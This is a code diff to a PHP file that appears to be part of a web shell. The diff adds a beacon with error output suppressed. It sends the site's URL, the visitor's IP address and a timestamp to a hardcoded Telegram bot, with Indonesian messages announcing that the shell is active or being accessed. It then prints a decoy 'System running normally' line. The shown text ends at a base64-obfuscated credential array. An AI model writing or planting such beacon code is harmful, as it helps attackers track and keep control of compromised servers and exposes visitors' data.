@@ -2,14 +2,25 @@
 error_reporting(0);
 ini_set('display_errors', 0);
 
-$botToken = "AAHJUv9t9FlAPS3ZsqRNUIfZ0ut5h6grP_U";
-$chatId = "8652693265";
+$botToken = "8652693265:AAHJUv9t9FlAPS3ZsqRNUIfZ0ut5h6grP_U";
+$chatId   = "8740437616";
 
-$domain = $_SERVER['HTTP_HOST'];
-$path = $_SERVER['REQUEST_URI'];
+$domain   = $_SERVER['HTTP_HOST'];
+$path     = $_SERVER['REQUEST_URI'];
+$ip_addr  = $_SERVER['REMOTE_ADDR']; 
 $full_url = "http://" . $domain . $path;
-$message = "Shell Aktif di: " . $full_url;
-$sendToTelegram = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
+
+$message  = "📢 **Shell Akses Terdeteksi!**\n";
+$message .= "🌐 URL: " . $full_url . "\n";
+$message .= "📍 IP Pengakses: " . $ip_addr . "\n";
+$message .= "⏰ Waktu: " . date("Y-m-d H:i:s");
+
+
+$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
+
+@file_get_contents($url);
+
+echo "System Berjalan Normal.";
 
 $GLOBALS['WHISKAS'] = array(
     'username' => base64_decode('d2hz'), 
